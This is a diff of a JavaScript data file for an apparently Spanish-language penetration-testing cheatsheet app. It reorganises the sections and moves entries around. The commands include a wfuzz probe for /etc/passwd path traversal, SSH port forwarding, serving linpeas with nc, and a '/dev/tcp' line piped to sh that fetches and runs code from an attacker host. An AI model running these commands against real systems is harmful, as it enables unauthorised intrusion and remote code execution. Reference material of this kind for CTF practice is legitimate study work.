@@ -3,15 +3,11 @@
  */
 export const cheatsheetSections = [
   { id: 'reconocimiento', titleKey: 'cheatsheet_section_recon' },
-  { id: 'exploitation', titleKey: 'cheatsheet_section_exploit' },
-  { id: 'brute-force', titleKey: 'cheatsheet_section_brute_force' },
-  { id: 'rce', titleKey: 'cheatsheet_section_rce' },
-  { id: 'tratamiento-consola', titleKey: 'cheatsheet_section_consola' },
-  { id: 'diccionarios', titleKey: 'cheatsheet_section_diccionarios' },
-  { id: 'compartir-recursos', titleKey: 'cheatsheet_section_compartir' },
+  { id: 'ataques-fuerza-bruta', titleKey: 'cheatsheet_section_brute_force' },
+  { id: 'post-explotacion', titleKey: 'cheatsheet_section_post_explotacion' },
+  { id: 'manejo-acceso', titleKey: 'cheatsheet_section_manejo_acceso' },
   { id: 'escalada', titleKey: 'cheatsheet_section_escalada' },
-  { id: 'port-forwarding', titleKey: 'cheatsheet_section_portfw' },
-  { id: 'crack-password', titleKey: 'cheatsheet_section_crack' },
+  { id: 'recursos', titleKey: 'cheatsheet_section_recursos' },
 ];
 
 export const cheatsheetTools = {
@@ -51,7 +47,7 @@ export const cheatsheetTools = {
   gobuster: {
     id: 'gobuster',
     sectionId: 'reconocimiento',
-    name: 'Gobuster',
+    name: 'Gobuster y WFuzz',
     descKey: 'cheatsheet_gobuster_desc',
     categories: [
       {
@@ -66,6 +62,7 @@ export const cheatsheetTools = {
         commands: [
           { descKey: 'cheatsheet_gobuster_cat2_cmd1', cmd: 'gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt' },
           { descKey: 'cheatsheet_gobuster_cat2_cmd2', cmd: 'gobuster dns -d target.com -w wordlist.txt --resolver 8.8.8.8' },
+          { descKey: 'cheatsheet_recon_wfuzz', cmd: 'wfuzz -c -hl=136 -t 200 -w [dic] -u [URL]/index.php?FUZZ=/etc/passwd' },
         ],
       },
       {
@@ -93,17 +90,16 @@ export const cheatsheetTools = {
           { descKey: 'cheatsheet_recon_arp', cmd: 'arp-scan -I eth0 -localnet -ignoredups' },
           { descKey: 'cheatsheet_recon_ss', cmd: 'ss -tln' },
           { descKey: 'cheatsheet_recon_netstat', cmd: 'netstat -tnlp' },
-          { descKey: 'cheatsheet_recon_wfuzz', cmd: 'wfuzz -c -hl=136 -t 200 -w [dic] -u [URL]/index.php?FUZZ=/etc/passwd' },
           { descKey: 'cheatsheet_recon_whatweb', cmd: 'whatweb [ip]' },
         ],
       },
     ],
   },
 
-  // ========== EXPLOITATION ==========
+  // ========== ATAQUES DE FUERZA BRUTA ==========
   searchsploit: {
     id: 'searchsploit',
-    sectionId: 'exploitation',
+    sectionId: 'post-explotacion',
     name: 'Searchsploit',
     descKey: 'cheatsheet_searchsploit_desc',
     categories: [
@@ -118,10 +114,10 @@ export const cheatsheetTools = {
     ],
   },
 
-  // ========== BRUTE FORCE ==========
+  // ========== POST-EXPLOTACIÓN ==========
   hydra: {
     id: 'hydra',
-    sectionId: 'brute-force',
+    sectionId: 'ataques-fuerza-bruta',
     name: 'Hydra',
     descKey: 'cheatsheet_hydra_desc',
     categories: [
@@ -135,7 +131,7 @@ export const cheatsheetTools = {
   },
   john: {
     id: 'john',
-    sectionId: 'brute-force',
+    sectionId: 'ataques-fuerza-bruta',
     name: 'John the Ripper',
     descKey: 'cheatsheet_john_desc',
     categories: [
@@ -152,7 +148,7 @@ export const cheatsheetTools = {
   // ========== RCE ==========
   rce: {
     id: 'rce',
-    sectionId: 'rce',
+    sectionId: 'post-explotacion',
     nameKey: 'cheatsheet_rce_name',
     descKey: 'cheatsheet_rce_desc',
     categories: [
@@ -169,10 +165,10 @@ export const cheatsheetTools = {
     ],
   },
 
-  // ========== TRATAMIENTO CONSOLA ==========
+  // ========== MANEJO DE ACCESO ==========
   consola: {
     id: 'consola',
-    sectionId: 'tratamiento-consola',
+    sectionId: 'manejo-acceso',
     nameKey: 'cheatsheet_consola_name',
     descKey: 'cheatsheet_consola_desc',
     categories: [
@@ -190,10 +186,27 @@ export const cheatsheetTools = {
     ],
   },
 
-  // ========== DICCIONARIOS ==========
+  // ========== PORT FORWARDING ==========
+  portfw: {
+    id: 'portfw',
+    sectionId: 'manejo-acceso',
+    nameKey: 'cheatsheet_portfw_name',
+    descKey: 'cheatsheet_portfw_desc',
+    categories: [
+      {
+        titleKey: 'cheatsheet_portfw_title',
+        commands: [
+          { descKey: 'cheatsheet_portfw_ssh', cmd: 'ssh -L [host_port]:[ip_local_victim:port_victim] [username@ip_victim]' },
+          { descKey: 'cheatsheet_portfw_example', cmd: 'ssh -L 9999:localhost:8080 michael@sightless.htb' },
+        ],
+      },
+    ],
+  },
+
+  // ========== RECURSOS ==========
   diccionarios: {
     id: 'diccionarios',
-    sectionId: 'diccionarios',
+    sectionId: 'recursos',
     nameKey: 'cheatsheet_diccionarios_name',
     descKey: 'cheatsheet_diccionarios_desc',
     categories: [
@@ -207,11 +220,24 @@ export const cheatsheetTools = {
       },
     ],
   },
-
-  // ========== COMPARTIR RECURSOS ==========
+  payloads: {
+    id: 'payloads',
+    sectionId: 'recursos',
+    name: 'Payloads',
+    descKey: 'cheatsheet_payloads_desc',
+    categories: [
+      {
+        titleKey: 'cheatsheet_payloads_title',
+        commands: [
+          { descKey: 'cheatsheet_payloads_repo', cmd: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master' },
+          { descKey: 'cheatsheet_payloads_web', cmd: 'https://swisskyrepo.github.io/PayloadsAllTheThings/' },
+        ],
+      },
+    ],
+  },
   compartir: {
     id: 'compartir',
-    sectionId: 'compartir-recursos',
+    sectionId: 'recursos',
     nameKey: 'cheatsheet_compartir_name',
     descKey: 'cheatsheet_compartir_desc',
     categories: [
@@ -238,24 +264,7 @@ export const cheatsheetTools = {
           { descKey: 'cheatsheet_escalada_cap', cmd: 'getcap -r / 2>/dev/null' },
           { descKey: 'cheatsheet_escalada_sudo', cmd: 'sudo -l' },
           { descKey: 'cheatsheet_escalada_nc_host', cmd: 'sudo nc -q 5 -lvnp 80 < linpeas.sh' },
-          { descKey: 'cheatsheet_escalada_nc_victim', cmd: 'cat < /dev/tcp/10.10.10.10/80 | sh' },
-        ],
-      },
-    ],
-  },
-
-  // ========== PORT FORWARDING ==========
-  portfw: {
-    id: 'portfw',
-    sectionId: 'port-forwarding',
-    nameKey: 'cheatsheet_portfw_name',
-    descKey: 'cheatsheet_portfw_desc',
-    categories: [
-      {
-        titleKey: 'cheatsheet_portfw_title',
-        commands: [
-          { descKey: 'cheatsheet_portfw_ssh', cmd: 'ssh -L [host_port]:[ip_local_victim:port_victim] [username@ip_victim]' },
-          { descKey: 'cheatsheet_portfw_example', cmd: 'ssh -L 9999:localhost:8080 michael@sightless.htb' },
+          { descKey: 'cheatsheet_escalada_nc_victim', cmd: 'cat < /dev/tcp/[host_ip]/[host_port] | sh' },
         ],
       },
     ],
